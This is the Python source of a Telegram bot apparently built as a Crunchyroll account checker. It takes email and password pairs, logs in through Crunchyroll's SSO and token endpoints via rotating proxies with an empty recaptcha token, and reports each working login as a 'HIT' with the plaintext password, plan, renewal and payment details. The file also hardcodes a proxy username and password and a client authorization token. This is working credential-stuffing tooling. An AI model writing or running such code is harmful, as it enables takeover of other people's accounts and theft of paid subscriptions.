import requests
import re
import json
import logging
import sqlite3
import threading
import time
from datetime import datetime, timedelta
import pytz
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatMember
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes, ConversationHandler
from telegram.constants import ParseMode
from telegram.error import TelegramError

# setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Flask app for health check
flask_app = Flask(__name__)

# conversation states
EMAIL, PASSWORD, PROXY_URL, PROXY_USERNAME, PROXY_PASSWORD, CHANNEL_ID_1, CHANNEL_ID_2, ADMIN_EMAIL, ADMIN_PASS = range(9)

BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
ADMIN_USERNAME = "@ego_exist"

# global for bot application
telegram_app = None
last_health_check = datetime.now()

# load emoji pack
try:
    with open('emoji_pack.json', 'r') as f:
        EMOJI_PACK = json.load(f)
except FileNotFoundError:
    logger.warning("emoji_pack.json not found, using unicode emojis")
    EMOJI_PACK = {'packs': {}}

def get_emoji(emoji_char, default_index=0):
    """get emoji ID from pack"""
    for pack_name, pack_data in EMOJI_PACK.get('packs', {}).items():
        for emoji_item in pack_data.get('emojis', []):
            if emoji_item['emoji'] == emoji_char:
                return f"<emoji id=\"{emoji_item['id']}\">"
    return emoji_char

# emoji mapping
EMOJIS = {
    'check': get_emoji('✅'),
    'cross': get_emoji('❌'),
    'rocket': get_emoji('🚀'),
    'fire': get_emoji('🔥'),
    'star': get_emoji('⭐'),
    'diamond': get_emoji('💎'),
    'heart': get_emoji('❤'),
    'skull': get_emoji('💀'),
    'warning': get_emoji('⚠'),
    'gear': get_emoji('⚙'),
    'lock': get_emoji('🔒'),
    'globe': get_emoji('🌍'),
    'key': get_emoji('🔑'),
    'money': get_emoji('💰'),
    'crown': get_emoji('👑'),
    'danger': get_emoji('⛔')
}

# ============ FLASK HEALTH ENDPOINT ============

@flask_app.route('/health', methods=['GET'])
def health_check():
    """health check endpoint for external pinging"""
    global last_health_check
    last_health_check = datetime.now()
    
    return jsonify({
        'status': 'alive',
        'timestamp': last_health_check.isoformat(),
        'bot_active': telegram_app is not None,
        'message': 'Bot is running and ready to serve'
    }), 200

@flask_app.route('/status', methods=['GET'])
def bot_status():
    """detailed bot status"""
    proxy_enabled = get_config('use_proxy') == 'true'
    channels_count = len(get_channels())
    
    return jsonify({
        'status': 'online',
        'timestamp': datetime.now().isoformat(),
        'uptime': str(datetime.now()),
        'proxy_enabled': proxy_enabled,
        'proxy_url': get_config('proxy_url') or 'Not configured',
        'channels_configured': channels_count,
        'emoji_pack_loaded': len(EMOJI_PACK.get('packs', {})) > 0,
        'admin': ADMIN_USERNAME
    }), 200

@flask_app.route('/ping', methods=['GET', 'POST'])
def ping():
    """ping endpoint for keepalive"""
    global last_health_check
    last_health_check = datetime.now()
    
    return jsonify({
        'pong': True,
        'timestamp': last_health_check.isoformat()
    }), 200

@flask_app.route('/', methods=['GET'])
def root():
    """root endpoint"""
    return jsonify({
        'name': 'Crunchyroll Checker Bot',
        'version': '2.0',
        'status': 'running',
        'endpoints': {
            'health': '/health',
            'status': '/status',
            'ping': '/ping'
        }
    }), 200

# ============ DATABASE ============

def init_db():
    conn = sqlite3.connect('bot_config.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS bot_config (
        key TEXT PRIMARY KEY,
        value TEXT
    )''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        is_admin INTEGER DEFAULT 0
    )''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS channels (
        channel_id TEXT PRIMARY KEY,
        channel_type TEXT,
        username TEXT
    )''')
    conn.commit()
    conn.close()

def save_config(key, value):
    conn = sqlite3.connect('bot_config.db')
    cursor = conn.cursor()
    cursor.execute('INSERT OR REPLACE INTO bot_config (key, value) VALUES (?, ?)', (key, value))
    conn.commit()
    conn.close()

def get_config(key):
    conn = sqlite3.connect('bot_config.db')
    cursor = conn.cursor()
    cursor.execute('SELECT value FROM bot_config WHERE key = ?', (key,))
    result = cursor.fetchone()
    conn.close()
    return result[0] if result else None

def save_channel(channel_id, channel_type):
    conn = sqlite3.connect('bot_config.db')
    cursor = conn.cursor()
    cursor.execute('INSERT OR REPLACE INTO channels (channel_id, channel_type) VALUES (?, ?)', (channel_id, channel_type))
    conn.commit()
    conn.close()

def get_channels():
    conn = sqlite3.connect('bot_config.db')
    cursor = conn.cursor()
    cursor.execute('SELECT channel_id, channel_type FROM channels')
    results = cursor.fetchall()
    conn.close()
    return results

# ============ TELEGRAM HANDLERS ============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """start command"""
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    
    is_admin = username == ADMIN_USERNAME.lstrip('@')
    
    keyboard = [
        [InlineKeyboardButton(f"{EMOJIS['check']} Check Account", callback_data='check')],
        [InlineKeyboardButton(f"{EMOJIS['gear']} Settings", callback_data='settings')],
    ]
    
    if is_admin:
        keyboard.append([InlineKeyboardButton(f"{EMOJIS['crown']} Admin Panel", callback_data='admin')])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"{EMOJIS['rocket']} <b>Crunchyroll Checker Pro</b>\n\n"
        f"{EMOJIS['star']} Send email and password to verify account\n"
        f"{EMOJIS['lock']} All data processed securely\n"
        f"<code>24/7 Uptime: ACTIVE</code>",
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

async def check_account_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """start account check"""
    await update.callback_query.answer()
    
    channels = get_channels()
    if channels:
        for channel_id, channel_type in channels:
            try:
                await context.bot.get_chat(channel_id)
                await update.callback_query.edit_message_text(
                    f"{EMOJIS['warning']} Must join required channels\n\n"
                    f"Channel: {channel_id}\n"
                    f"Type: {channel_type}",
                    parse_mode=ParseMode.HTML
                )
                return EMAIL
            except TelegramError:
                pass
    
    await update.callback_query.edit_message_text(
        f"{EMOJIS['key']} Send your email address:",
        parse_mode=ParseMode.HTML
    )
    return EMAIL

async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """capture email"""
    email = update.message.text.strip()
    context.user_data['email'] = email
    
    await update.message.reply_text(
        f"{EMOJIS['lock']} Now send your password:",
        parse_mode=ParseMode.HTML
    )
    return PASSWORD

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """capture password and verify"""
    password = update.message.text.strip()
    email = context.user_data.get('email')
    
    proxy_config = {
        'use_proxy': get_config('use_proxy') == 'true',
        'proxy_url': get_config('proxy_url') or 'p.webshare.io:80:vdvciddl-rotate:gx8bxvuu2ev1'
    }
    
    await update.message.reply_text(
        f"{EMOJIS['rocket']} Checking account... stand by",
        parse_mode=ParseMode.HTML
    )
    
    result = verify_crunchyroll_account(email, password, proxy_config)
    
    if result['success']:
        await format_and_send_result(update, email, password, result['data'])
    else:
        await update.message.reply_text(
            f"{EMOJIS['cross']} <b>Check Failed</b>\n\n{result['error']}",
            parse_mode=ParseMode.HTML
        )
    
    return ConversationHandler.END

async def settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """settings menu"""
    await update.callback_query.answer()
    
    keyboard = [
        [InlineKeyboardButton(f"{EMOJIS['globe']} Proxy Settings", callback_data='proxy_menu')],
        [InlineKeyboardButton(f"{EMOJIS['danger']} Channel Join", callback_data='channel_menu')],
        [InlineKeyboardButton(f"{EMOJIS['key']} Back", callback_data='start')]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        f"{EMOJIS['gear']} <b>Settings Menu</b>",
        reply_markup=reply_markup,
        parse_mode=ParseMode.HTML
    )

async def proxy_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """proxy configuration menu"""
    await update.callback_query.answer()
    
    current_proxy = get_config('proxy_url') or 'Not configured'
    
    keyboard = [
        [InlineKeyboardButton("Add/Update Proxy", callback_data='add_proxy')],
        [InlineKeyboardButton("Toggle Proxy", callback_data='toggle_proxy')],
        [InlineKeyboardButton("Back", callback_data='settings')]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        f"{EMOJIS['globe']} <b>Proxy Settings</b>\n\n"
        f"Current: <code>{current_proxy}</code>\n"
        f"Status: {'✅ Enabled' if get_config('use_proxy') == 'true' else '❌ Disabled'}",
        reply_markup=reply_markup,
        parse_mode=ParseMode.HTML
    )

async def add_proxy_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """prompt for proxy URL"""
    await update.callback_query.answer()
    await update.callback_query.edit_message_text(
        f"{EMOJIS['key']} Send proxy URL (format: ip:port:user:pass):",
        parse_mode=ParseMode.HTML
    )
    return PROXY_URL

async def get_proxy_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """capture proxy URL"""
    proxy_url = update.message.text.strip()
    
    if not re.match(r'^[^:]+:\d+:[^:]+:[^:]+$', proxy_url):
        await update.message.reply_text(
            f"{EMOJIS['cross']} Invalid format. Use: ip:port:username:password"
        )
        return PROXY_URL
    
    save_config('proxy_url', proxy_url)
    save_config('use_proxy', 'true')
    
    await update.message.reply_text(
        f"{EMOJIS['check']} Proxy configured successfully!",
        parse_mode=ParseMode.HTML
    )
    return ConversationHandler.END

async def toggle_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """toggle proxy on/off"""
    await update.callback_query.answer()
    
    current_status = get_config('use_proxy') == 'true'
    new_status = not current_status
    save_config('use_proxy', 'true' if new_status else 'false')
    
    await update.callback_query.edit_message_text(
        f"{EMOJIS['check']} Proxy {'enabled' if new_status else 'disabled'}",
        parse_mode=ParseMode.HTML
    )

async def channel_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """channel configuration menu"""
    await update.callback_query.answer()
    
    channels = get_channels()
    channel_list = "\n".join([f"• {ch[0]} ({ch[1]})" for ch in channels]) if channels else "No channels configured"
    
    keyboard = [
        [InlineKeyboardButton("Add Channel", callback_data='add_channel')],
        [InlineKeyboardButton("Back", callback_data='settings')]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        f"{EMOJIS['danger']} <b>Channel Configuration</b>\n\n"
        f"Required Channels:\n{channel_list}",
        reply_markup=reply_markup,
        parse_mode=ParseMode.HTML
    )

async def add_channel_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """prompt for channel ID"""
    await update.callback_query.answer()
    await update.callback_query.edit_message_text(
        f"{EMOJIS['key']} Send channel ID (or -channel_username):",
        parse_mode=ParseMode.HTML
    )
    return CHANNEL_ID_1

async def get_channel_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """capture channel ID"""
    channel_id = update.message.text.strip()
    context.user_data['channel_id'] = channel_id
    
    await update.message.reply_text(
        f"{EMOJIS['key']} Is this public or private? (Type: public/private):",
        parse_mode=ParseMode.HTML
    )
    return CHANNEL_ID_2

async def get_channel_type(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """capture channel type"""
    channel_type = update.message.text.strip().lower()
    
    if channel_type not in ['public', 'private']:
        await update.message.reply_text(
            f"{EMOJIS['cross']} Please type 'public' or 'private'"
        )
        return CHANNEL_ID_2
    
    channel_id = context.user_data.get('channel_id')
    save_channel(channel_id, channel_type)
    
    await update.message.reply_text(
        f"{EMOJIS['check']} Channel added! {channel_id} ({channel_type})",
        parse_mode=ParseMode.HTML
    )
    return ConversationHandler.END

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """admin panel"""
    await update.callback_query.answer()
    
    username = update.effective_user.username or ""
    if username != ADMIN_USERNAME.lstrip('@'):
        await update.callback_query.answer(f"{EMOJIS['cross']} Admin only!", show_alert=True)
        return
    
    keyboard = [
        [InlineKeyboardButton(f"{EMOJIS['diamond']} View Stats", callback_data='admin_stats')],
        [InlineKeyboardButton(f"{EMOJIS['fire']} Manage Channels", callback_data='admin_channels')],
        [InlineKeyboardButton(f"{EMOJIS['gear']} Proxy Config", callback_data='admin_proxy')],
        [InlineKeyboardButton(f"{EMOJIS['key']} Back", callback_data='start')]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        f"{EMOJIS['crown']} <b>Admin Control Panel</b>\n\n"
        f"Bot Status: Online {EMOJIS['check']}\n"
        f"Config DB: Active\n"
        f"Health Endpoint: <code>/health</code>",
        reply_markup=reply_markup,
        parse_mode=ParseMode.HTML
    )

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """show admin stats"""
    await update.callback_query.answer()
    
    channels = get_channels()
    proxy_enabled = get_config('use_proxy') == 'true'
    
    await update.callback_query.edit_message_text(
        f"{EMOJIS['diamond']} <b>Bot Statistics</b>\n\n"
        f"Channels Configured: {len(channels)}\n"
        f"Proxy Status: {'✅ Enabled' if proxy_enabled else '❌ Disabled'}\n"
        f"Proxy URL: <code>{get_config('proxy_url') or 'Not set'}</code>\n"
        f"Last Health Check: <code>{last_health_check.strftime('%Y-%m-%d %H:%M:%S')}</code>\n"
        f"Deployment: <code>Render</code>\n"
        f"Uptime: <code>24/7</code>",
        parse_mode=ParseMode.HTML
    )

async def admin_channels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """admin channel management"""
    await update.callback_query.answer()
    
    channels = get_channels()
    channel_list = "\n".join([f"• {ch[0]} ({ch[1]})" for ch in channels]) if channels else "None"
    
    keyboard = [
        [InlineKeyboardButton("Add Channel", callback_data='add_channel')],
        [InlineKeyboardButton("Back", callback_data='admin')]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        f"{EMOJIS['fire']} <b>Forced Channels</b>\n\n{channel_list}",
        reply_markup=reply_markup,
        parse_mode=ParseMode.HTML
    )

async def admin_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """admin proxy management"""
    await update.callback_query.answer()
    
    proxy_url = get_config('proxy_url') or 'Not configured'
    proxy_enabled = get_config('use_proxy') == 'true'
    
    keyboard = [
        [InlineKeyboardButton("Update Proxy", callback_data='add_proxy')],
        [InlineKeyboardButton(f"Toggle: {'OFF' if proxy_enabled else 'ON'}", callback_data='toggle_proxy')],
        [InlineKeyboardButton("Back", callback_data='admin')]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(
        f"{EMOJIS['globe']} <b>Proxy Configuration</b>\n\n"
        f"URL: <code>{proxy_url}</code>\n"
        f"Status: {'✅ Active' if proxy_enabled else '❌ Inactive'}",
        reply_markup=reply_markup,
        parse_mode=ParseMode.HTML
    )

def setup_proxy(proxy_string):
    """extract proxy credentials"""
    userpass_match = re.search(r'^[^:]+:[^:]+:([^:]+:[^_]+(?:_.+)?)$', proxy_string)
    userpass = userpass_match.group(1) if userpass_match else ""
    ipport_match = re.search(r'^([^:]+:[^:]+)', proxy_string)
    ipport = ipport_match.group(1) if ipport_match else ""
    proxy = f"http://{userpass}@{ipport}"
    return {"http": proxy, "https": proxy}

def verify_crunchyroll_account(email: str, password: str, proxy_config: dict) -> dict:
    """verify crunchyroll account"""
    try:
        proxies = None
        if proxy_config.get('use_proxy'):
            proxies = setup_proxy(proxy_config['proxy_url'])
        
        session = requests.Session()
        if proxies:
            session.proxies.update(proxies)
        
        login_url = "https://sso.crunchyroll.com/api/login"
        login_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0",
            "Accept": "*/*",
            "Content-Type": "application/json",
            "Origin": "https://sso.crunchyroll.com",
        }
        
        login_data = {
            "email": email,
            "password": password,
            "recaptchaToken": "",
            "eventSettings": {}
        }
        
        login_response = session.post(login_url, headers=login_headers, json=login_data, timeout=30)
        
        if login_response.status_code != 200:
            return {'success': False, 'error': 'Login failed - Invalid credentials'}
        
        device_id = login_response.cookies.get("device_id", "")
        
        token_url = "https://www.crunchyroll.com/auth/v1/token"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": "Basic bm9haWhkZXZtXzZpeWcwYThsMHE6",
        }
        
        token_data = {
            "device_id": device_id,
            "device_type": "Firefox on Windows",
            "grant_type": "etp_rt_cookie"
        }
        
        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=30)
        
        if token_response.status_code != 200:
            return {'success': False, 'error': 'Token request failed'}
        
        token_json = token_response.json()
        access_token = token_json.get('access_token', '')
        account_id = token_json.get('account_id', '')
        
        profile_url = "https://www.crunchyroll.com/accounts/v1/me/multiprofile"
        profile_headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "Accept": "application/json",
            "Authorization": f"Bearer {access_token}",
        }
        
        profile_response = session.get(profile_url, headers=profile_headers, timeout=30)
        profile_data = profile_response.json() if profile_response.status_code == 200 else {}
        
        sub_url = f"https://www.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions"
        sub_response = session.get(sub_url, headers=profile_headers, timeout=30)
        sub_data = sub_response.json() if sub_response.status_code == 200 else {}
        
        return {
            'success': True,
            'data': {
                'profile': profile_data,
                'subscription': sub_data,
                'account_id': account_id,
            }
        }
        
    except Exception as e:
        return {'success': False, 'error': f'Error: {str(e)}'}

async def format_and_send_result(update: Update, email: str, password: str, data: dict):
    """format and send account details"""
    profile_data = data.get('profile', {})
    sub_data = data.get('subscription', {})
    
    profiles = profile_data.get('profiles', [])
    subscriptions = sub_data.get('subscriptions', [])
    subscription = subscriptions[0] if subscriptions else {}
    plan = subscription.get('plan', {})
    tier = plan.get('tier', {})
    price = plan.get('price', {})
    payment = sub_data.get('currentPaymentMethod', {})
    
    next_renewal = subscription.get('nextRenewalDate', '')
    days_left = "N/A"
    if next_renewal:
        try:
            renewal_date = datetime.strptime(next_renewal.replace('Z', '+00:00'), "%Y-%m-%dT%H:%M:%S%z")
            now = datetime.now(pytz.UTC)
            days_left = max(0, (renewal_date - now).days)
        except:
            pass
    
    country_map = {
        "US": "🇺🇸 United States", "GB": "🇬🇧 United Kingdom", "CA": "🇨🇦 Canada",
        "AU": "🇦🇺 Australia", "JP": "🇯🇵 Japan", "DE": "🇩🇪 Germany",
        "FR": "🇫🇷 France", "BR": "🇧🇷 Brazil", "IN": "🇮🇳 India"
    }
    
    country_code = payment.get('countryCode', '') or plan.get('countryCode', '')
    country = country_map.get(country_code, country_code or 'Unknown')
    
    result_text = f"""<b>{EMOJIS['check']} CRUNCHYROLL HIT</b>

<b>📧 Email:</b> <code>{email}</code>
<b>{EMOJIS['lock']} Password:</b> <code>{password}</code>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>{EMOJIS['diamond']} ACCOUNT DETAILS</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>Status:</b>
• Active: {'✅' if subscription.get('status') == 'active' else '❌'}
• Plan: {tier.get('text', 'Unknown')}
• Expires In: {days_left} days
• Country: {country}

<b>Profile:</b>
• Name: {profiles[0].get('profile_name', 'Unknown') if profiles else 'Unknown'}
• Created: {subscription.get('startDate', 'Unknown')[:10] if subscription.get('startDate') else 'Unknown'}

<b>Subscription:</b>
• Tier: {tier.get('text', 'Unknown')}
• Currency: {price.get('currencyCode', 'Unknown')}
• Payment: {payment.get('paymentMethodType', 'Unknown').replace('_', ' ').title()}
• Status: {payment.get('status', 'Unknown').capitalize()}
• Auto Renewal: {'Yes' if subscription.get('subscriptionQualifier') == 'RECURRING' else 'No'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    await update.message.reply_text(result_text, parse_mode=ParseMode.HTML)

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """cancel"""
    await update.message.reply_text(f"{EMOJIS['cross']} Cancelled")
    return ConversationHandler.END

def run_telegram_bot():
    """run telegram bot in separate thread"""
    global telegram_app
    
    app = Application.builder().token(BOT_TOKEN).build()
    telegram_app = app
    
    # conversation handlers
    check_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(check_account_start, pattern='check')],
        states={
            EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_email)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    
    proxy_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(add_proxy_prompt, pattern='add_proxy')],
        states={
            PROXY_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_proxy_url)]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    
    channel_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(add_channel_prompt, pattern='add_channel')],
        states={
            CHANNEL_ID_1: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_channel_id)],
            CHANNEL_ID_2: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_channel_type)]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    
    app.add_handler(CommandHandler('start', start))
    app.add_handler(CallbackQueryHandler(settings_menu, pattern='settings'))
    app.add_handler(CallbackQueryHandler(proxy_menu, pattern='proxy_menu'))
    app.add_handler(CallbackQueryHandler(toggle_proxy, pattern='toggle_proxy'))
    app.add_handler(CallbackQueryHandler(channel_menu, pattern='channel_menu'))
    app.add_handler(CallbackQueryHandler(admin_panel, pattern='admin'))
    app.add_handler(CallbackQueryHandler(admin_stats, pattern='admin_stats'))
    app.add_handler(CallbackQueryHandler(admin_channels, pattern='admin_channels'))
    app.add_handler(CallbackQueryHandler(admin_proxy, pattern='admin_proxy'))
    app.add_handler(check_conv)
    app.add_handler(proxy_conv)
    app.add_handler(channel_conv)
    
    logger.info("Starting Telegram bot polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    init_db()
    
    # run telegram bot in background thread
    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
    bot_thread.start()
    
    # run flask app on port 5000
    port = int(__import__('os').environ.get('PORT', 5000))
    logger.info(f"Starting Flask health check server on port {port}...")
    flask_app.run(host='0.0.0.0', port=port, debug=False)
